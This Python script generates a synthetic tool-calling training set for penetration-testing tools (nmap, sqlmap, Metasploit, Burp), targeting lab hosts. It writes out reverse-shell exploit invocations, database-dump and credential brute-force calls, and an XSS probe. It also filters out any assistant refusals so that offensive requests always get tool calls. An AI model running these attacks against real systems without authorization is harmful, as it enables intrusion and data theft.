#!/usr/bin/env python3
"""Build cgr-tooluse-sft-v0.3 — Qwen3.5-native tool-calling SFT.

FORMAT DECISION (matches Qwen/Qwen3.5-9B chat_template.jinja + v0.2 adapter):
  Supervised assistant target emits XML hermes-style tool calls:

    <tool_call>
    <function=TOOL_NAME>
    <parameter=ARG>
    VALUE
    </parameter>
    ...
    </function>
    </tool_call>

  - Tools listed in system as JSON inside <tools>…</tools> (via tojson).
  - Complex / null parameter values serialized with json.dumps (JSON null, never
    Python "None" string) — same contract as Jinja `| tojson`.
  - Trajectory convention: thinking OFF for these rows (no <think> block).
    Tool calls are the primary supervised target; optional short prose MAY
    precede <tool_call> but NEVER follows it; tool_call is NEVER buried in <think>.
  - ~25% no-call / irrelevance mix: correct behavior is answer WITHOUT a tool
    call (tool-selection correctness, NOT refusal softening — offensive prompts
    that need tools still get capable tool calls).

Schemas: nmap, sqlmap, metasploit_rpc, burp under schemas/.
"""
from __future__ import annotations
import json, hashlib, random, sys
from pathlib import Path

ROOT = Path("/workspace/deephat-v2")
sys.path.insert(0, str(ROOT / "eval/frozen_v0.2"))
import refusal_filter as RF  # noqa: E402

OUT = ROOT / "data/tooluse"
SCHEMAS = OUT / "schemas"
RNG = random.Random(43)

TOOLS = json.loads((SCHEMAS / "tools.json").read_text())
TOOL_BY_NAME = {t["function"]["name"]: t for t in TOOLS}


def json_param_value(v):
    """Serialize a parameter value the way Qwen chat_template |tojson does for
    mappings/sequences, and as a bare string otherwise. None -> JSON null text
    when the value is not a plain string (we always json.dumps non-strings AND
    also json.dumps None explicitly so we never emit Python None)."""
    if v is None:
        return "null"  # JSON null, NOT "None"
    if isinstance(v, bool):
        return "true" if v else "false"
    if isinstance(v, (int, float)):
        return json.dumps(v)
    if isinstance(v, (dict, list)):
        return json.dumps(v, ensure_ascii=False)
    # strings: bare (chat template uses |string for non-mapping/sequence)
    return str(v)


def render_tool_call(name: str, arguments: dict) -> str:
    """Qwen3.5 native XML tool call (function/parameter form)."""
    parts = [f"<tool_call>", f"<function={name}>"]
    for k, v in arguments.items():
        parts.append(f"<parameter={k}>")
        parts.append(json_param_value(v))
        parts.append("</parameter>")
    parts.append("</function>")
    parts.append("</tool_call>")
    return "\n".join(parts)


def tools_system_block() -> str:
    lines = [
        "# Tools",
        "",
        "You have access to the following functions:",
        "",
        "<tools>",
    ]
    for t in TOOLS:
        lines.append(json.dumps(t, ensure_ascii=False))
    lines.append("</tools>")
    lines.append("")
    lines.append(
        "If you choose to call a function ONLY reply in the following format with NO suffix:\n\n"
        "<tool_call>\n<function=example_function_name>\n"
        "<parameter=example_parameter_1>\nvalue_1\n</parameter>\n"
        "</function>\n</tool_call>\n\n"
        "You may provide optional brief reasoning BEFORE the function call, but NOT after. "
        "If no function call is appropriate, answer normally with your current knowledge "
        "and do not mention the tools."
    )
    return "\n".join(lines)


# --------------- seed tasks per tool ---------------
NMAP_TASKS = [
    ("SYN scan top ports on 10.0.0.11 with service detection.",
     {"target": "10.0.0.11", "ports": "22,80,443,3389,8080", "scan_type": "sV", "scripts": None, "timing": 4, "extra_args": "-Pn"}),
    ("Aggressive scan of 10.10.10.0/24 looking for SMB.",
     {"target": "10.10.10.0/24", "ports": "139,445", "scan_type": "A", "scripts": "smb-enum-shares,smb-os-discovery", "timing": 3, "extra_args": None}),
    ("UDP scan DNS/SNMP on lab host 192.168.56.10.",
     {"target": "192.168.56.10", "ports": "53,161", "scan_type": "sU", "scripts": None, "timing": 3, "extra_args": "-Pn"}),
    ("Ping sweep the engagement /24 without port scan.",
     {"target": "10.0.0.0/24", "ports": None, "scan_type": "sn", "scripts": None, "timing": None, "extra_args": None}),
    ("Version scan web ports and run http-enum NSE.",
     {"target": "app.lab.local", "ports": "80,443,8080,8443", "scan_type": "sV", "scripts": "http-enum", "timing": 4, "extra_args": "-Pn -n"}),
    ("Full TCP connect scan of a firewalled host that drops SYN.",
     {"target": "10.0.0.50", "ports": "1-1024", "scan_type": "sT", "scripts": None, "timing": 2, "extra_args": "-Pn"}),
    ("Scan for vulners on 10.0.0.20 port 443.",
     {"target": "10.0.0.20", "ports": "443", "scan_type": "sV", "scripts": "vulners", "timing": 3, "extra_args": "-Pn"}),
    ("Quick SYN sweep of common AD ports on dc01.lab.",
     {"target": "dc01.lab", "ports": "53,88,135,139,389,445,636,3268,3389", "scan_type": "sS", "scripts": None, "timing": 4, "extra_args": "-n"}),
]

SQLMAP_TASKS = [
    ("Test id= on DVWA SQLi low for databases.",
     {"url": "http://10.0.0.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit", "data": None, "p": "id", "technique": None, "dbms": "mysql", "level": 2, "risk": 1, "dbs": True, "tables": None, "D": None, "T": None, "dump": None, "batch": True, "extra_args": "--cookie=security=low;PHPSESSID=abc"}),
    ("POST login form SQLi check.",
     {"url": "http://10.0.0.11/login.php", "data": "username=admin&password=pass", "p": "username", "technique": "BEUSTQ", "dbms": None, "level": 3, "risk": 2, "dbs": None, "tables": None, "D": None, "T": None, "dump": None, "batch": True, "extra_args": None}),
    ("Dump users table from dvwa DB once injectable.",
     {"url": "http://10.0.0.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit", "data": None, "p": "id", "technique": "U", "dbms": "mysql", "level": 1, "risk": 1, "dbs": None, "tables": None, "D": "dvwa", "T": "users", "dump": True, "batch": True, "extra_args": "--cookie=security=low;PHPSESSID=abc"}),
    ("Time-based blind only on search param.",
     {"url": "http://shop.lab/search?q=test", "data": None, "p": "q", "technique": "T", "dbms": None, "level": 3, "risk": 2, "dbs": True, "tables": None, "D": None, "T": None, "dump": None, "batch": True, "extra_args": None}),
    ("Enumerate tables in appdb.",
     {"url": "http://10.0.0.30/item.php?id=5", "data": None, "p": "id", "technique": None, "dbms": "postgresql", "level": 2, "risk": 1, "dbs": None, "tables": True, "D": "appdb", "T": None, "dump": None, "batch": True, "extra_args": None}),
    ("JSON body injectable field 'filter'.",
     {"url": "http://api.lab/v1/query", "data": '{"filter":"1","limit":10}', "p": "filter", "technique": "B", "dbms": "mysql", "level": 2, "risk": 1, "dbs": True, "tables": None, "D": None, "T": None, "dump": None, "batch": True, "extra_args": "--headers=\"Content-Type: application/json\""}),
]

MSF_TASKS = [
    ("Start a multi/handler for linux/x64 meterpreter reverse tcp on 443.",
     {"action": "module.execute", "module_type": "exploit", "module_name": "multi/handler",
      "options": {"LHOST": "10.0.0.5", "LPORT": "443", "ExitOnSession": "false"},
      "payload": "linux/x64/meterpreter/reverse_tcp"}),
    ("Run SSH login aux scanner against 10.0.0.40 with user/pass files.",
     {"action": "module.execute", "module_type": "auxiliary", "module_name": "scanner/ssh/ssh_login",
      "options": {"RHOSTS": "10.0.0.40", "USER_FILE": "/tmp/users.txt", "PASS_FILE": "/tmp/pass.txt", "VERBOSE": "true"},
      "payload": None}),
    ("List active sessions.",
     {"action": "session.list", "module_type": None, "module_name": None, "options": None, "payload": None}),
    ("Exploit vsftpd 2.3.4 backdoor on 10.0.0.11.",
     {"action": "module.execute", "module_type": "exploit", "module_name": "unix/ftp/vsftpd_234_backdoor",
      "options": {"RHOSTS": "10.0.0.11", "RPORT": "21"},
      "payload": "cmd/unix/interact"}),
    ("List exploit modules (search-like).",
     {"action": "module.list", "module_type": "exploit", "module_name": None, "options": None, "payload": None}),
    ("Windows SMB ms17_010 against 10.10.10.8 with meterpreter.",
     {"action": "module.execute", "module_type": "exploit", "module_name": "windows/smb/ms17_010_eternalblue",
      "options": {"RHOSTS": "10.10.10.8", "LHOST": "10.10.14.2", "LPORT": "4444"},
      "payload": "windows/x64/meterpreter/reverse_tcp"}),
]

BURP_TASKS = [
    ("Repeater: replay login POST with tweaked password.",
     {"mode": "repeater", "method": "POST", "url": "http://app.lab/login",
      "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=abc"},
      "body": "username=admin&password=Passw0rd!", "payload_positions": None, "payloads": None, "attack_type": None}),
    ("Intruder sniper on id param with numeric payloads.",
     {"mode": "intruder", "method": "GET", "url": "http://app.lab/item?id=§1§",
      "headers": None, "body": None,
      "payload_positions": [{"ref": "id", "placeholder": "§1§"}],
      "payloads": ["1", "2", "3", "4", "5", "100", "999"], "attack_type": "sniper"}),
    ("Repeater: send crafted XSS probe in q.",
     {"mode": "repeater", "method": "GET",
      "url": "http://app.lab/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
      "headers": {"User-Agent": "Mozilla/5.0"}, "body": None,
      "payload_positions": None, "payloads": None, "attack_type": None}),
    ("Intruder cluster bomb user/pass.",
     {"mode": "intruder", "method": "POST", "url": "http://app.lab/login",
      "headers": {"Content-Type": "application/x-www-form-urlencoded"},
      "body": "user=§u§&pass=§p§",
      "payload_positions": [{"ref": "u", "placeholder": "§u§"}, {"ref": "p", "placeholder": "§p§"}],
      "payloads": ["admin", "root", "test", "Password1", "admin123"], "attack_type": "cluster_bomb"}),
    ("Repeater: PUT JSON update with IDOR id.",
     {"mode": "repeater", "method": "PUT", "url": "http://api.lab/v1/users/12",
      "headers": {"Content-Type": "application/json", "Authorization": "Bearer labtoken"},
      "body": "{\"role\":\"admin\"}", "payload_positions": None, "payloads": None, "attack_type": None}),
]

# No-call / irrelevance (~25%): answer WITHOUT tool_call. Still capable/offensive when
# the question is offsec knowledge — just not a tool invocation.
NO_CALL_TASKS = [
    ("What does the TCP three-way handshake accomplish at a high level?",
     "SYN → SYN-ACK → ACK establishes a TCP session, synchronizes sequence numbers, and agrees initial window state before data transfer."),
    ("Explain the difference between a reverse shell and a bind shell.",
     "Bind shell: target listens, attacker connects in. Reverse shell: target dials out to attacker listener — usually better through NAT/firewall egress."),
    ("Is 2+2 equal to 4?",
     "Yes. 2+2=4."),
    ("Write a haiku about coffee.",
     "Dark roast steam rising\nMug warms tired morning hands\nCode compiles cleaner"),
    ("What year did CVE numbering become common practice roughly?",
     "CVE was launched in 1999 by MITRE; by the early 2000s CVE IDs were the common cross-vendor vulnerability handle."),
    ("Translate 'good morning' to Spanish.",
     "Buenos días."),
    ("Name three common hashcat attack modes (-a).",
     "0 = straight (dictionary), 1 = combination, 3 = brute-force/mask, 6/7 = hybrid wordlist+mask. Most cracking starts with -a 0 + rules."),
    ("What is the capital of France?",
     "Paris."),
    ("Explain NX/DEP without running any scanner.",
     "NX/DEP marks data pages non-executable so injected shellcode on stack/heap should fault; bypasses use ROP/JOP returning into existing executable gadgets."),
    ("How do you conceptually approach Kerberoasting? (no tools)",
     "Request TGS for SPN-bearing accounts, take the encrypted ticket offline, crack the service account password.hash — prefer AS-REP roastable / weak-password service accounts. Tooling comes after the plan."),
    ("What color is a typical Kali terminal default theme question — ignore tools.",
     "Kali's default terminal aesthetic is commonly associated with a dark background and blue/gray prompt styling; exact theme varies by version."),
    ("Summarize MITRE ATT&CK tactic TA0006.",
     "TA0006 Credential Access: techniques to steal account credentials (dumping, keylogging, ticket theft, brute force, etc.)."),
    ("Does this prompt require nmap? 'Explain Big-O of binary search.'",
     "No tool call needed. Binary search is O(log n) comparisons on a sorted array."),
    ("Politely decline calling sqlmap for 'what's the weather in Oslo?'",
     "That's outside the engagement tooling — Oslo weather isn't something nmap/sqlmap/msf/burp can answer. Try a weather service; I won't invent a tool call."),
    ("Give the default MySQL port.",
     "3306/tcp."),
]


def expand_tasks(base_tasks, tool_name, target_n):
    """Repeat/permute tasks with light variation to reach target count."""
    out = []
    i = 0
    while len(out) < target_n:
        prompt, args = base_tasks[i % len(base_tasks)]
        args = dict(args)
        # light target/IP jitter for diversity
        if tool_name == "nmap" and "target" in args and args["target"]:
            if RNG.random() < 0.4 and args["target"][0].isdigit():
                parts = args["target"].split(".")
                if len(parts) == 4 and parts[-1].isdigit():
                    parts[-1] = str(RNG.randint(1, 254))
                    args["target"] = ".".join(parts)
                    prompt = prompt + f" (host {args['target']})"
        if tool_name == "sqlmap" and RNG.random() < 0.3:
            args["level"] = RNG.choice([1, 2, 3, None])
            args["risk"] = RNG.choice([1, 2, None])
        # metasploit options copy
        if tool_name == "metasploit_rpc" and isinstance(args.get("options"), dict):
            args["options"] = dict(args["options"])
        prose = RNG.choice([
            "",
            "Calling the appropriate tool now.",
            "Engagement scope covers this target — invoking the tool.",
            f"Using `{tool_name}` for this step.",
        ])
        call = render_tool_call(tool_name, args)
        response = (prose + "\n\n" + call).strip() if prose else call
        out.append((prompt, response, tool_name, args))
        i += 1
    return out


def make_row(user, assistant, kind, tool_name=None, args=None, license_flag="synthetic-own-generation"):
    # hard gate: assistant opening must not be refusal
    if RF.is_refusal(assistant):
        return None
    # for call rows, must contain tool_call; for no_call, must NOT
    if kind == "tool_call":
        if "<tool_call>" not in assistant or "</tool_call>" not in assistant:
            return None
        if "<think>" in assistant:
            return None  # convention: thinking off / never bury call in think
    else:
        if "<tool_call>" in assistant:
            return None
    system = tools_system_block()
    row = {
        "messages": [
            {"role": "system", "content": system},
            {"role": "user", "content": user},
            {"role": "assistant", "content": assistant},
        ],
        "tools_json": json.dumps(TOOLS, ensure_ascii=False),
        "meta": {
            "source": "cgr-tooluse-sft-v0.3-synthetic",
            "license": "own-generation",
            "license_flag": license_flag,
            "recipe": "tooluse_sft_qwen35_xml",
            "kind": kind,  # tool_call | no_call
            "tool_name": tool_name,
            "thinking": "off",
            "tool_call_format": "qwen35_xml_function_parameter",
            "args_sha256": hashlib.sha256(
                json.dumps(args, sort_keys=True, default=str).encode()
            ).hexdigest() if args is not None else None,
        },
    }
    return row


def main():
    # Target >=500; aim ~800+ with 25% no-call
    target_total = 800
    n_nocall = int(round(target_total * 0.25))
    n_call = target_total - n_nocall
    per_tool = n_call // 4

    call_rows = []
    for name, tasks in [
        ("nmap", NMAP_TASKS),
        ("sqlmap", SQLMAP_TASKS),
        ("metasploit_rpc", MSF_TASKS),
        ("burp", BURP_TASKS),
    ]:
        expanded = expand_tasks(tasks, name, per_tool)
        for prompt, response, tool_name, args in expanded:
            row = make_row(prompt, response, "tool_call", tool_name, args)
            if row:
                call_rows.append(row)

    nocall_rows = []
    i = 0
    while len(nocall_rows) < n_nocall:
        prompt, answer = NO_CALL_TASKS[i % len(NO_CALL_TASKS)]
        # slight paraphrase suffix for diversity
        if i >= len(NO_CALL_TASKS):
            prompt = prompt + f" (variant {i // len(NO_CALL_TASKS)})"
        row = make_row(prompt, answer, "no_call")
        if row:
            nocall_rows.append(row)
        i += 1

    rows = call_rows + nocall_rows
    RNG.shuffle(rows)

    # Validate null serialization never emits Python None
    bad_none = [r for r in rows if "\nNone\n" in r["messages"][-1]["content"] or ">None<" in r["messages"][-1]["content"]]
    # Also check literal 'None' as sole parameter body
    none_param = []
    for r in rows:
        c = r["messages"][-1]["content"]
        if "<parameter=" in c and "\nNone\n</parameter>" in c:
            none_param.append(r)
    assert not none_param, "Python None leaked into parameter bodies"
    assert not any(RF.is_refusal(r["messages"][-1]["content"]) for r in rows)

    out_path = OUT / "cgr_tooluse_sft_v0.3.jsonl"
    with out_path.open("w") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")

    n_call_final = sum(1 for r in rows if r["meta"]["kind"] == "tool_call")
    n_nocall_final = sum(1 for r in rows if r["meta"]["kind"] == "no_call")
    by_tool = {}
    for r in rows:
        if r["meta"]["kind"] == "tool_call":
            by_tool[r["meta"]["tool_name"]] = by_tool.get(r["meta"]["tool_name"], 0) + 1

    # spot-check a metasploit row has JSON null for payload=None
    sample_null = None
    for r in rows:
        if r["meta"].get("tool_name") == "metasploit_rpc" and "null" in r["messages"][-1]["content"]:
            sample_null = r["messages"][-1]["content"]
            break

    manifest = {
        "rows": len(rows),
        "tool_call_rows": n_call_final,
        "no_call_rows": n_nocall_final,
        "no_call_pct": round(100 * n_nocall_final / max(1, len(rows)), 2),
        "by_tool": by_tool,
        "format": "qwen35_xml_function_parameter inside <tool_call>",
        "thinking": "off — tool_call after any prose; never inside <think>",
        "null_serialization": "JSON null via json_param_value; never Python None",
        "sample_null_snippet": (sample_null or "")[:500],
        "schemas": ["nmap", "sqlmap", "metasploit_rpc", "burp"],
        "out_jsonl": str(out_path),
        "constraint": "offensive tool calls intact; no-call mix is irrelevance/tool-selection not refusal softening",
    }
    (OUT / "cgr_tooluse_sft_v0.3_manifest.json").write_text(json.dumps(manifest, indent=2))
    print(json.dumps(manifest, indent=2))
    if len(rows) < 500:
        sys.exit(2)


if __name__ == "__main__":
    main()
